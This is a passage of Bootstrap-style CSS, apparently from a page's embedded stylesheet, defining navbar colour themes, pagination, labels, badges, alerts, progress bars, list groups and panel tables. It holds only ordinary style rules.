            .navbar-form .checkbox label {
                padding-left: 0;
            }

            .navbar-form .radio input[type="radio"],
            .navbar-form .checkbox input[type="checkbox"] {
                position: relative;
                margin-left: 0;
            }

            .navbar-form .has-feedback .form-control-feedback {
                top: 0;
            }
        }

        @media (max-width: 767px) {
            .navbar-form .form-group {
                margin-bottom: 5px;
            }

            .navbar-form .form-group:last-child {
                margin-bottom: 0;
            }
        }

        @media (min-width: 768px) {
            .navbar-form {
                width: auto;
                padding-top: 0;
                padding-bottom: 0;
                margin-right: 0;
                margin-left: 0;
                border: 0;
                box-shadow: none;
            }
        }

        .navbar-nav>li>.dropdown-menu {
            margin-top: 0;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .navbar-fixed-bottom .navbar-nav>li>.dropdown-menu {
            margin-bottom: 0;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }

        .navbar-btn {
            margin-top: 13px;
            margin-bottom: 13px;
        }

        .navbar-btn.btn-sm,
        .btn-group-sm>.navbar-btn.btn {
            margin-top: 7.5px;
            margin-bottom: 7.5px;
        }

        .navbar-btn.btn-xs,
        .btn-group-xs>.navbar-btn.btn {
            margin-top: 19px;
            margin-bottom: 19px;
        }

        .navbar-text {
            margin-top: 20px;
            margin-bottom: 20px;
        }

        @media (min-width: 768px) {
            .navbar-text {
                float: left;
                margin-right: 15px;
                margin-left: 15px;
            }
        }

        @media (min-width: 768px) {
            .navbar-left {
                float: left !important;
            }

            .navbar-right {
                float: right !important;
                margin-right: -15px;
            }

            .navbar-right~.navbar-right {
                margin-right: 0;
            }
        }

        .navbar-default {
            background-color: #576b7c;
            border-color: transparent;
        }

        .navbar-default .navbar-brand {
            color: #fff;
        }

        .navbar-default .navbar-brand:hover,
        .navbar-default .navbar-brand:focus {
            color: #e6e5e5;
            background-color: transparent;
        }

        .navbar-default .navbar-text {
            color: #fff;
        }

        .navbar-default .navbar-nav>li>a {
            color: #fff;
        }

        .navbar-default .navbar-nav>li>a:hover,
        .navbar-default .navbar-nav>li>a:focus {
            color: #fff;
            background-color: transparent;
        }

        .navbar-default .navbar-nav>.active>a,
        .navbar-default .navbar-nav>.active>a:hover,
        .navbar-default .navbar-nav>.active>a:focus {
            color: #fff;
            background-color: #495a69;
        }

        .navbar-default .navbar-nav>.disabled>a,
        .navbar-default .navbar-nav>.disabled>a:hover,
        .navbar-default .navbar-nav>.disabled>a:focus {
            color: #CCCCCC;
            background-color: transparent;
        }

        .navbar-default .navbar-nav>.open>a,
        .navbar-default .navbar-nav>.open>a:hover,
        .navbar-default .navbar-nav>.open>a:focus {
            color: #fff;
            background-color: #495a69;
        }

        @media (max-width: 767px) {
            .navbar-default .navbar-nav .open .dropdown-menu>li>a {
                color: #fff;
            }

            .navbar-default .navbar-nav .open .dropdown-menu>li>a:hover,
            .navbar-default .navbar-nav .open .dropdown-menu>li>a:focus {
                color: #fff;
                background-color: transparent;
            }

            .navbar-default .navbar-nav .open .dropdown-menu>.active>a,
            .navbar-default .navbar-nav .open .dropdown-menu>.active>a:hover,
            .navbar-default .navbar-nav .open .dropdown-menu>.active>a:focus {
                color: #fff;
                background-color: #495a69;
            }

            .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a,
            .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:hover,
            .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:focus {
                color: #CCCCCC;
                background-color: transparent;
            }
        }

        .navbar-default .navbar-toggle {
            border-color: #CCCCCC;
        }

        .navbar-default .navbar-toggle:hover,
        .navbar-default .navbar-toggle:focus {
            background-color: #CCCCCC;
        }

        .navbar-default .navbar-toggle .icon-bar {
            background-color: #999999;
        }

        .navbar-default .navbar-collapse,
        .navbar-default .navbar-form {
            border-color: transparent;
        }

        .navbar-default .navbar-link {
            color: #fff;
        }

        .navbar-default .navbar-link:hover {
            color: #fff;
        }

        .navbar-default .btn-link {
            color: #fff;
        }

        .navbar-default .btn-link:hover,
        .navbar-default .btn-link:focus {
            color: #fff;
        }

        .navbar-default .btn-link[disabled]:hover,
        .navbar-default .btn-link[disabled]:focus,
        fieldset[disabled] .navbar-default .btn-link:hover,
        fieldset[disabled] .navbar-default .btn-link:focus {
            color: #CCCCCC;
        }

        .navbar-inverse {
            background-color: #576b7c;
            border-color: transparent;
        }

        .navbar-inverse .navbar-brand {
            color: #fff;
        }

        .navbar-inverse .navbar-brand:hover,
        .navbar-inverse .navbar-brand:focus {
            color: #fff;
            background-color: transparent;
        }

        .navbar-inverse .navbar-text {
            color: #fff;
        }

        .navbar-inverse .navbar-nav>li>a {
            color: #fff;
        }

        .navbar-inverse .navbar-nav>li>a:hover,
        .navbar-inverse .navbar-nav>li>a:focus {
            color: #fff;
            background-color: transparent;
        }

        .navbar-inverse .navbar-nav>.active>a,
        .navbar-inverse .navbar-nav>.active>a:hover,
        .navbar-inverse .navbar-nav>.active>a:focus {
            color: #fff;
            background-color: #495a69;
        }

        .navbar-inverse .navbar-nav>.disabled>a,
        .navbar-inverse .navbar-nav>.disabled>a:hover,
        .navbar-inverse .navbar-nav>.disabled>a:focus {
            color: #CCCCCC;
            background-color: transparent;
        }

        .navbar-inverse .navbar-nav>.open>a,
        .navbar-inverse .navbar-nav>.open>a:hover,
        .navbar-inverse .navbar-nav>.open>a:focus {
            color: #fff;
            background-color: #495a69;
        }

        @media (max-width: 767px) {
            .navbar-inverse .navbar-nav .open .dropdown-menu>.dropdown-header {
                border-color: transparent;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu .divider {
                background-color: transparent;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu>li>a {
                color: #fff;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu>li>a:hover,
            .navbar-inverse .navbar-nav .open .dropdown-menu>li>a:focus {
                color: #fff;
                background-color: transparent;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a,
            .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:hover,
            .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:focus {
                color: #fff;
                background-color: #495a69;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a,
            .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:hover,
            .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:focus {
                color: #CCCCCC;
                background-color: transparent;
            }
        }

        .navbar-inverse .navbar-toggle {
            border-color: #CCCCCC;
        }

        .navbar-inverse .navbar-toggle:hover,
        .navbar-inverse .navbar-toggle:focus {
            background-color: #CCCCCC;
        }

        .navbar-inverse .navbar-toggle .icon-bar {
            background-color: #999999;
        }

        .navbar-inverse .navbar-collapse,
        .navbar-inverse .navbar-form {
            border-color: #485967;
        }

        .navbar-inverse .navbar-link {
            color: #fff;
        }

        .navbar-inverse .navbar-link:hover {
            color: #fff;
        }

        .navbar-inverse .btn-link {
            color: #fff;
        }

        .navbar-inverse .btn-link:hover,
        .navbar-inverse .btn-link:focus {
            color: #fff;
        }

        .navbar-inverse .btn-link[disabled]:hover,
        .navbar-inverse .btn-link[disabled]:focus,
        fieldset[disabled] .navbar-inverse .btn-link:hover,
        fieldset[disabled] .navbar-inverse .btn-link:focus {
            color: #CCCCCC;
        }

        .breadcrumb {
            padding: 8px 15px;
            margin-bottom: 20px;
            list-style: none;
            background-color: #f5f5f5;
            border-radius: 4px;
        }

        .breadcrumb>li {
            display: inline-block;
        }

        .breadcrumb>li+li:before {
            padding: 0 5px;
            color: #ccc;
            content: "/ ";
        }

        .breadcrumb>.active {
            color: #777777;
        }

        .pagination {
            display: inline-block;
            padding-left: 0;
            margin: 20px 0;
            border-radius: 4px;
        }

        .pagination>li {
            display: inline;
        }

        .pagination>li>a,
        .pagination>li>span {
            position: relative;
            float: left;
            padding: 6px 12px;
            margin-left: -1px;
            line-height: 1.42857143;
            color: #337ab7;
            text-decoration: none;
            background-color: #fff;
            border: 1px solid #ddd;
        }

        .pagination>li>a:hover,
        .pagination>li>a:focus,
        .pagination>li>span:hover,
        .pagination>li>span:focus {
            z-index: 2;
            color: #23527c;
            background-color: #eeeeee;
            border-color: #ddd;
        }

        .pagination>li:first-child>a,
        .pagination>li:first-child>span {
            margin-left: 0;
            border-top-left-radius: 4px;
            border-bottom-left-radius: 4px;
        }

        .pagination>li:last-child>a,
        .pagination>li:last-child>span {
            border-top-right-radius: 4px;
            border-bottom-right-radius: 4px;
        }

        .pagination>.active>a,
        .pagination>.active>a:hover,
        .pagination>.active>a:focus,
        .pagination>.active>span,
        .pagination>.active>span:hover,
        .pagination>.active>span:focus {
            z-index: 3;
            color: #fff;
            cursor: default;
            background-color: #337ab7;
            border-color: #337ab7;
        }

        .pagination>.disabled>span,
        .pagination>.disabled>span:hover,
        .pagination>.disabled>span:focus,
        .pagination>.disabled>a,
        .pagination>.disabled>a:hover,
        .pagination>.disabled>a:focus {
            color: #777777;
            cursor: not-allowed;
            background-color: #fff;
            border-color: #ddd;
        }

        .pagination-lg>li>a,
        .pagination-lg>li>span {
            padding: 10px 16px;
            font-size: 17px;
            line-height: 1.3333333;
        }

        .pagination-lg>li:first-child>a,
        .pagination-lg>li:first-child>span {
            border-top-left-radius: 6px;
            border-bottom-left-radius: 6px;
        }

        .pagination-lg>li:last-child>a,
        .pagination-lg>li:last-child>span {
            border-top-right-radius: 6px;
            border-bottom-right-radius: 6px;
        }

        .pagination-sm>li>a,
        .pagination-sm>li>span {
            padding: 5px 10px;
            font-size: 11px;
            line-height: 1.5;
        }

        .pagination-sm>li:first-child>a,
        .pagination-sm>li:first-child>span {
            border-top-left-radius: 3px;
            border-bottom-left-radius: 3px;
        }

        .pagination-sm>li:last-child>a,
        .pagination-sm>li:last-child>span {
            border-top-right-radius: 3px;
            border-bottom-right-radius: 3px;
        }

        .pager {
            padding-left: 0;
            margin: 20px 0;
            text-align: center;
            list-style: none;
        }

        .pager:before,
        .pager:after {
            display: table;
            content: " ";
        }

        .pager:after {
            clear: both;
        }

        .pager li {
            display: inline;
        }

        .pager li>a,
        .pager li>span {
            display: inline-block;
            padding: 5px 14px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 15px;
        }

        .pager li>a:hover,
        .pager li>a:focus {
            text-decoration: none;
            background-color: #eeeeee;
        }

        .pager .next>a,
        .pager .next>span {
            float: right;
        }

        .pager .previous>a,
        .pager .previous>span {
            float: left;
        }

        .pager .disabled>a,
        .pager .disabled>a:hover,
        .pager .disabled>a:focus,
        .pager .disabled>span {
            color: #777777;
            cursor: not-allowed;
            background-color: #fff;
        }

        .label {
            display: inline;
            padding: .2em .6em .3em;
            font-size: 75%;
            font-weight: 700;
            line-height: 1;
            color: #fff;
            text-align: center;
            white-space: nowrap;
            vertical-align: baseline;
            border-radius: .25em;
        }

        .label:empty {
            display: none;
        }

        .btn .label {
            position: relative;
            top: -1px;
        }

        a.label:hover,
        a.label:focus {
            color: #fff;
            text-decoration: none;
            cursor: pointer;
        }

        .label-default {
            background-color: #777777;
        }

        .label-default[href]:hover,
        .label-default[href]:focus {
            background-color: #5e5e5e;
        }

        .label-primary {
            background-color: #337ab7;
        }

        .label-primary[href]:hover,
        .label-primary[href]:focus {
            background-color: #286090;
        }

        .label-success {
            background-color: #5cb85c;
        }

        .label-success[href]:hover,
        .label-success[href]:focus {
            background-color: #449d44;
        }

        .label-info {
            background-color: #5bc0de;
        }

        .label-info[href]:hover,
        .label-info[href]:focus {
            background-color: #31b0d5;
        }

        .label-warning {
            background-color: #f0ad4e;
        }

        .label-warning[href]:hover,
        .label-warning[href]:focus {
            background-color: #ec971f;
        }

        .label-danger {
            background-color: #d9534f;
        }

        .label-danger[href]:hover,
        .label-danger[href]:focus {
            background-color: #c9302c;
        }

        .badge {
            display: inline-block;
            min-width: 10px;
            padding: 3px 7px;
            font-size: 11px;
            font-weight: bold;
            line-height: 1;
            color: #fff;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            background-color: #777777;
            border-radius: 10px;
        }

        .badge:empty {
            display: none;
        }

        .btn .badge {
            position: relative;
            top: -1px;
        }

        .btn-xs .badge,
        .btn-group-xs>.btn .badge,
        .btn-group-xs>.btn .badge {
            top: 0;
            padding: 1px 5px;
        }

        .list-group-item.active>.badge,
        .nav-pills>.active>a>.badge {
            color: #337ab7;
            background-color: #fff;
        }

        .list-group-item>.badge {
            float: right;
        }

        .list-group-item>.badge+.badge {
            margin-right: 5px;
        }

        .nav-pills>li>a>.badge {
            margin-left: 3px;
        }

        a.badge:hover,
        a.badge:focus {
            color: #fff;
            text-decoration: none;
            cursor: pointer;
        }

        .jumbotron {
            padding-top: 30px;
            padding-bottom: 30px;
            margin-bottom: 30px;
            color: inherit;
            background-color: #eeeeee;
        }

        .jumbotron h1,
        .jumbotron .h1 {
            color: inherit;
        }

        .jumbotron p {
            margin-bottom: 15px;
            font-size: 21px;
            font-weight: 200;
        }

        .jumbotron>hr {
            border-top-color: #d5d5d5;
        }

        .container .jumbotron,
        .container-fluid .jumbotron {
            padding-right: 15px;
            padding-left: 15px;
            border-radius: 6px;
        }

        .jumbotron .container {
            max-width: 100%;
        }

        @media screen and (min-width: 768px) {
            .jumbotron {
                padding-top: 48px;
                padding-bottom: 48px;
            }

            .container .jumbotron,
            .container-fluid .jumbotron {
                padding-right: 60px;
                padding-left: 60px;
            }

            .jumbotron h1,
            .jumbotron .h1 {
                font-size: 63px;
            }
        }

        .thumbnail {
            display: block;
            padding: 4px;
            margin-bottom: 20px;
            line-height: 1.42857143;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 4px;
            transition: border 0.2s ease-in-out;
        }

        .thumbnail>img,
        .thumbnail a>img {
            display: block;
            max-width: 100%;
            height: auto;
            margin-right: auto;
            margin-left: auto;
        }

        .thumbnail .caption {
            padding: 9px;
            color: #333333;
        }

        a.thumbnail:hover,
        a.thumbnail:focus,
        a.thumbnail.active {
            border-color: #333333;
        }

        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid transparent;
            border-radius: 4px;
        }

        .alert h4 {
            margin-top: 0;
            color: inherit;
        }

        .alert .alert-link {
            font-weight: bold;
        }

        .alert>p,
        .alert>ul {
            margin-bottom: 0;
        }

        .alert>p+p {
            margin-top: 5px;
        }

        .alert-dismissable,
        .alert-dismissible {
            padding-right: 35px;
        }

        .alert-dismissable .close,
        .alert-dismissible .close {
            position: relative;
            top: -2px;
            right: -21px;
            color: inherit;
        }

        .alert-success {
            color: #3c763d;
            background-color: #dff0d8;
            border-color: #d6e9c6;
        }

        .alert-success hr {
            border-top-color: #c9e2b3;
        }

        .alert-success .alert-link {
            color: #2b542c;
        }

        .alert-info {
            color: #31708f;
            background-color: #d9edf7;
            border-color: #bce8f1;
        }

        .alert-info hr {
            border-top-color: #a6e1ec;
        }

        .alert-info .alert-link {
            color: #245269;
        }

        .alert-warning {
            color: #8a6d3b;
            background-color: #fcf8e3;
            border-color: #faebcc;
        }

        .alert-warning hr {
            border-top-color: #f7e1b5;
        }

        .alert-warning .alert-link {
            color: #66512c;
        }

        .alert-danger {
            color: #a94442;
            background-color: #f2dede;
            border-color: #ebccd1;
        }

        .alert-danger hr {
            border-top-color: #e4b9c0;
        }

        .alert-danger .alert-link {
            color: #843534;
        }

        @keyframes progress-bar-stripes {
            from {
                background-position: 40px 0;
            }

            to {
                background-position: 0 0;
            }
        }

        .progress {
            height: 20px;
            margin-bottom: 20px;
            overflow: hidden;
            background-color: #f5f5f5;
            border-radius: 4px;
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
        }

        .progress-bar {
            float: left;
            width: 0%;
            height: 100%;
            font-size: 11px;
            line-height: 20px;
            color: #fff;
            text-align: center;
            background-color: #337ab7;
            box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
            transition: width 0.6s ease;
        }

        .progress-striped .progress-bar,
        .progress-bar-striped {
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-size: 40px 40px;
        }

        .progress.active .progress-bar,
        .progress-bar.active {
            animation: progress-bar-stripes 2s linear infinite;
        }

        .progress-bar-success {
            background-color: #5cb85c;
        }

        .progress-striped .progress-bar-success {
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        }

        .progress-bar-info {
            background-color: #5bc0de;
        }

        .progress-striped .progress-bar-info {
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        }

        .progress-bar-warning {
            background-color: #f0ad4e;
        }

        .progress-striped .progress-bar-warning {
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        }

        .progress-bar-danger {
            background-color: #d9534f;
        }

        .progress-striped .progress-bar-danger {
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        }

        .media {
            margin-top: 15px;
        }

        .media:first-child {
            margin-top: 0;
        }

        .media,
        .media-body {
            overflow: hidden;
            zoom: 1;
        }

        .media-body {
            width: 10000px;
        }

        .media-object {
            display: block;
        }

        .media-object.img-thumbnail {
            max-width: none;
        }

        .media-right,
        .media>.pull-right {
            padding-left: 10px;
        }

        .media-left,
        .media>.pull-left {
            padding-right: 10px;
        }

        .media-left,
        .media-right,
        .media-body {
            display: table-cell;
            vertical-align: top;
        }

        .media-middle {
            vertical-align: middle;
        }

        .media-bottom {
            vertical-align: bottom;
        }

        .media-heading {
            margin-top: 0;
            margin-bottom: 5px;
        }

        .media-list {
            padding-left: 0;
            list-style: none;
        }

        .list-group {
            padding-left: 0;
            margin-bottom: 20px;
        }

        .list-group-item {
            position: relative;
            display: block;
            padding: 10px 15px;
            margin-bottom: -1px;
            background-color: #fff;
            border: 1px solid #ddd;
        }

        .list-group-item:first-child {
            border-top-left-radius: 4px;
            border-top-right-radius: 4px;
        }

        .list-group-item:last-child {
            margin-bottom: 0;
            border-bottom-right-radius: 4px;
            border-bottom-left-radius: 4px;
        }

        .list-group-item.disabled,
        .list-group-item.disabled:hover,
        .list-group-item.disabled:focus {
            color: #777777;
            cursor: not-allowed;
            background-color: #eeeeee;
        }

        .list-group-item.disabled .list-group-item-heading,
        .list-group-item.disabled:hover .list-group-item-heading,
        .list-group-item.disabled:focus .list-group-item-heading {
            color: inherit;
        }

        .list-group-item.disabled .list-group-item-text,
        .list-group-item.disabled:hover .list-group-item-text,
        .list-group-item.disabled:focus .list-group-item-text {
            color: #777777;
        }

        .list-group-item.active,
        .list-group-item.active:hover,
        .list-group-item.active:focus {
            z-index: 2;
            color: #fff;
            background-color: #337ab7;
            border-color: #337ab7;
        }

        .list-group-item.active .list-group-item-heading,
        .list-group-item.active .list-group-item-heading>small,
        .list-group-item.active .list-group-item-heading>.small,
        .list-group-item.active:hover .list-group-item-heading,
        .list-group-item.active:hover .list-group-item-heading>small,
        .list-group-item.active:hover .list-group-item-heading>.small,
        .list-group-item.active:focus .list-group-item-heading,
        .list-group-item.active:focus .list-group-item-heading>small,
        .list-group-item.active:focus .list-group-item-heading>.small {
            color: inherit;
        }

        .list-group-item.active .list-group-item-text,
        .list-group-item.active:hover .list-group-item-text,
        .list-group-item.active:focus .list-group-item-text {
            color: #c7ddef;
        }

        a.list-group-item,
        button.list-group-item {
            color: #555;
        }

        a.list-group-item .list-group-item-heading,
        button.list-group-item .list-group-item-heading {
            color: #333;
        }

        a.list-group-item:hover,
        a.list-group-item:focus,
        button.list-group-item:hover,
        button.list-group-item:focus {
            color: #555;
            text-decoration: none;
            background-color: #f5f5f5;
        }

        button.list-group-item {
            width: 100%;
            text-align: left;
        }

        .list-group-item-success {
            color: #409020;
            background-color: #EDF7ED;
        }

        a.list-group-item-success,
        button.list-group-item-success {
            color: #409020;
        }

        a.list-group-item-success .list-group-item-heading,
        button.list-group-item-success .list-group-item-heading {
            color: inherit;
        }

        a.list-group-item-success:hover,
        a.list-group-item-success:focus,
        button.list-group-item-success:hover,
        button.list-group-item-success:focus {
            color: #409020;
            background-color: #dbefdb;
        }

        a.list-group-item-success.active,
        a.list-group-item-success.active:hover,
        a.list-group-item-success.active:focus,
        button.list-group-item-success.active,
        button.list-group-item-success.active:hover,
        button.list-group-item-success.active:focus {
            color: #fff;
            background-color: #409020;
            border-color: #409020;
        }

        .list-group-item-info {
            color: #2E79AC;
            background-color: #EBF4FB;
        }

        a.list-group-item-info,
        button.list-group-item-info {
            color: #2E79AC;
        }

        a.list-group-item-info .list-group-item-heading,
        button.list-group-item-info .list-group-item-heading {
            color: inherit;
        }

        a.list-group-item-info:hover,
        a.list-group-item-info:focus,
        button.list-group-item-info:hover,
        button.list-group-item-info:focus {
            color: #2E79AC;
            background-color: #d6e8f7;
        }

        a.list-group-item-info.active,
        a.list-group-item-info.active:hover,
        a.list-group-item-info.active:focus,
        button.list-group-item-info.active,
        button.list-group-item-info.active:hover,
        button.list-group-item-info.active:focus {
            color: #fff;
            background-color: #2E79AC;
            border-color: #2E79AC;
        }

        .list-group-item-warning {
            color: #997A00;
            background-color: #FFFAE6;
        }

        a.list-group-item-warning,
        button.list-group-item-warning {
            color: #997A00;
        }

        a.list-group-item-warning .list-group-item-heading,
        button.list-group-item-warning .list-group-item-heading {
            color: inherit;
        }

        a.list-group-item-warning:hover,
        a.list-group-item-warning:focus,
        button.list-group-item-warning:hover,
        button.list-group-item-warning:focus {
            color: #997A00;
            background-color: #fff5cd;
        }

        a.list-group-item-warning.active,
        a.list-group-item-warning.active:hover,
        a.list-group-item-warning.active:focus,
        button.list-group-item-warning.active,
        button.list-group-item-warning.active:hover,
        button.list-group-item-warning.active:focus {
            color: #fff;
            background-color: #997A00;
            border-color: #997A00;
        }

        .list-group-item-danger {
            color: #d63636;
            background-color: #FAEBEB;
        }

        a.list-group-item-danger,
        button.list-group-item-danger {
            color: #d63636;
        }

        a.list-group-item-danger .list-group-item-heading,
        button.list-group-item-danger .list-group-item-heading {
            color: inherit;
        }

        a.list-group-item-danger:hover,
        a.list-group-item-danger:focus,
        button.list-group-item-danger:hover,
        button.list-group-item-danger:focus {
            color: #d63636;
            background-color: #f5d7d7;
        }

        a.list-group-item-danger.active,
        a.list-group-item-danger.active:hover,
        a.list-group-item-danger.active:focus,
        button.list-group-item-danger.active,
        button.list-group-item-danger.active:hover,
        button.list-group-item-danger.active:focus {
            color: #fff;
            background-color: #d63636;
            border-color: #d63636;
        }

        .list-group-item-heading {
            margin-top: 0;
            margin-bottom: 5px;
        }

        .list-group-item-text {
            margin-bottom: 0;
            line-height: 1.3;
        }

        .panel {
            margin-bottom: 20px;
            background-color: #fff;
            border: 1px solid transparent;
            border-radius: 6px;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
        }

        .panel-body {
            padding: 15px;
        }

        .panel-body:before,
        .panel-body:after {
            display: table;
            content: " ";
        }

        .panel-body:after {
            clear: both;
        }

        .panel-heading {
            padding: 10px 15px;
            border-bottom: 1px solid transparent;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

        .panel-heading>.dropdown .dropdown-toggle {
            color: inherit;
        }

        .panel-title {
            margin-top: 0;
            margin-bottom: 0;
            font-size: 16px;
            color: inherit;
        }

        .panel-title>a,
        .panel-title>small,
        .panel-title>.small,
        .panel-title>small>a,
        .panel-title>.small>a {
            color: inherit;
        }

        .panel-footer {
            padding: 10px 15px;
            background-color: #f5f5f5;
            border-top: 1px solid #CCCCCC;
            border-bottom-right-radius: 5px;
            border-bottom-left-radius: 5px;
        }

        .panel>.list-group,
        .panel>.panel-collapse>.list-group {
            margin-bottom: 0;
        }

        .panel>.list-group .list-group-item,
        .panel>.panel-collapse>.list-group .list-group-item {
            border-width: 1px 0;
            border-radius: 0;
        }

        .panel>.list-group:first-child .list-group-item:first-child,
        .panel>.panel-collapse>.list-group:first-child .list-group-item:first-child {
            border-top: 0;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

        .panel>.list-group:last-child .list-group-item:last-child,
        .panel>.panel-collapse>.list-group:last-child .list-group-item:last-child {
            border-bottom: 0;
            border-bottom-right-radius: 5px;
            border-bottom-left-radius: 5px;
        }

        .panel>.panel-heading+.panel-collapse>.list-group .list-group-item:first-child {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .panel-heading+.list-group .list-group-item:first-child {
            border-top-width: 0;
        }

        .list-group+.panel-footer {
            border-top-width: 0;
        }

        .panel>.table,
        .panel>.table-responsive>.table,
        .panel>.panel-collapse>.table {
            margin-bottom: 0;
        }

        .panel>.table caption,
        .panel>.table-responsive>.table caption,
        .panel>.panel-collapse>.table caption {
            padding-right: 15px;
            padding-left: 15px;
        }

        .panel>.table:first-child,
        .panel>.table-responsive:first-child>.table:first-child {
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

        .panel>.table:first-child>thead:first-child>tr:first-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child {
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

        .panel>.table:first-child>thead:first-child>tr:first-child td:first-child,
        .panel>.table:first-child>thead:first-child>tr:first-child th:first-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child td:first-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child th:first-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:first-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:first-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:first-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:first-child {
            border-top-left-radius: 5px;
        }

        .panel>.table:first-child>thead:first-child>tr:first-child td:last-child,
        .panel>.table:first-child>thead:first-child>tr:first-child th:last-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child td:last-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child th:last-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:last-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:last-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:last-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:last-child {
            border-top-right-radius: 5px;
        }

        .panel>.table:last-child,
        .panel>.table-responsive:last-child>.table:last-child {
            border-bottom-right-radius: 5px;
            border-bottom-left-radius: 5px;
        }

        .panel>.table:last-child>tbody:last-child>tr:last-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child {
            border-bottom-right-radius: 5px;
            border-bottom-left-radius: 5px;
        }

        .panel>.table:last-child>tbody:last-child>tr:last-child td:first-child,
        .panel>.table:last-child>tbody:last-child>tr:last-child th:first-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child td:first-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child th:first-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:first-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:first-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:first-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:first-child {
            border-bottom-left-radius: 5px;
        }

        .panel>.table:last-child>tbody:last-child>tr:last-child td:last-child,
        .panel>.table:last-child>tbody:last-child>tr:last-child th:last-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child td:last-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child th:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:last-child {
            border-bottom-right-radius: 5px;
        }

        .panel>.panel-body+.table,
        .panel>.panel-body+.table-responsive,
        .panel>.table+.panel-body,
        .panel>.table-responsive+.panel-body {
            border-top: 1px solid #CCCCCC;
        }

        .panel>.table>tbody:first-child>tr:first-child th,
        .panel>.table>tbody:first-child>tr:first-child td {
            border-top: 0;
        }

        .panel>.table-bordered,
        .panel>.table-responsive>.table-bordered {
            border: 0;
        }

        .panel>.table-bordered>thead>tr>th:first-child,
        .panel>.table-bordered>thead>tr>td:first-child,
        .panel>.table-bordered>tbody>tr>th:first-child,
        .panel>.table-bordered>tbody>tr>td:first-child,
        .panel>.table-bordered>tfoot>tr>th:first-child,
        .panel>.table-bordered>tfoot>tr>td:first-child,
        .panel>.table-responsive>.table-bordered>thead>tr>th:first-child,
        .panel>.table-responsive>.table-bordered>thead>tr>td:first-child,
        .panel>.table-responsive>.table-bordered>tbody>tr>th:first-child,
        .panel>.table-responsive>.table-bordered>tbody>tr>td:first-child,
